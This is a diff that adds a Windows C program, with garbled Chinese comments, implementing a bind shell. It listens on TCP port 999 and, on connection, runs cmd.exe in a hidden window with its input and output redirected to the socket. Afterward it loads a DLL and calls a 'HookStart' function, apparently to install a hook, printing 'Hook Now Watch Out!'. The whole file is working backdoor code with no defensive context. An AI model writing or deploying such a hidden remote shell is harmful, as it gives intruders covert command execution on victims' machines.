@@ -1,0 +1,80 @@
+
+
+
+#pragma comment(lib, "ws2_32.lib")
+#include <stdlib.h>
+#include <winsock2.h>
+#include <windows.h>
+#define MasterPort 999  //定??听端口999
+
+#include "stdio.h"
+#include "windows.h"
+
+typedef void (*PFN_HOOKSTART)();
+
+
+main()   //主函?入口
+{         
+  WSADATA WSADa;
+sockaddr_in SockAddrIn;
+  SOCKET CSocket,SSocket;
+int iAddrSize;
+  PROCESS_INFORMATION ProcessInfo;
+  STARTUPINFO StartupInfo;
+char szCMDPath[255];
+ 
+//分配?存?源，初始化?据：
+ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
+ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
+ZeroMemory(&WSADa, sizeof(WSADATA));
+ 
+//?取cmd路?
+GetEnvironmentVariable("COMSPEC",szCMDPath,sizeof(szCMDPath));
+ 
+//加?ws2_32.dll：
+WSAStartup(0x0202,&WSADa);
+ 
+//?置本地信息和?定??，建立socket，代?如下：
+SockAddrIn.sin_family = AF_INET;
+SockAddrIn.sin_addr.s_addr = INADDR_ANY;
+SockAddrIn.sin_port = htons(MasterPort);
+CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+ 
+//?置?定端口999：
+bind(CSocket,(sockaddr *)&SockAddrIn,sizeof(SockAddrIn));
+ 
+ //?置服?器端?听端口：
+listen(CSocket,1);
+iAddrSize = sizeof(SockAddrIn);
+ 
+//?始?接?程服?器，并配置?藏窗口?构体：
+SSocket = accept(CSocket,(sockaddr *)&SockAddrIn,&iAddrSize);
+StartupInfo.cb = sizeof(STARTUPINFO);
+StartupInfo.wShowWindow = SW_HIDE;
+StartupInfo.dwFlags = STARTF_USESTDHANDLES |
+STARTF_USESHOWWINDOW;
+StartupInfo.hStdInput = (HANDLE)SSocket;
+StartupInfo.hStdOutput = (HANDLE)SSocket;
+StartupInfo.hStdError = (HANDLE)SSocket;
+ 
+//?建匿名管道：
+CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);
+WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+CloseHandle(ProcessInfo.hProcess);
+CloseHandle(ProcessInfo.hThread);
+ 
+//???程句柄：
+closesocket(CSocket);
+closesocket(SSocket);
+WSACleanup();
+  //???接卸?ws2_32.dll
+    HMODULE            hDll = NULL;
+    PFN_HOOKSTART    HookStart = NULL;
+    hDll = LoadLibraryA("TestDLL.dll");
+    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, "HookStart");
+    HookStart();
+    FreeLibrary(hDll);
+    printf("Hook Now Watch Out！");
+system("pause");
+return 0;
+}
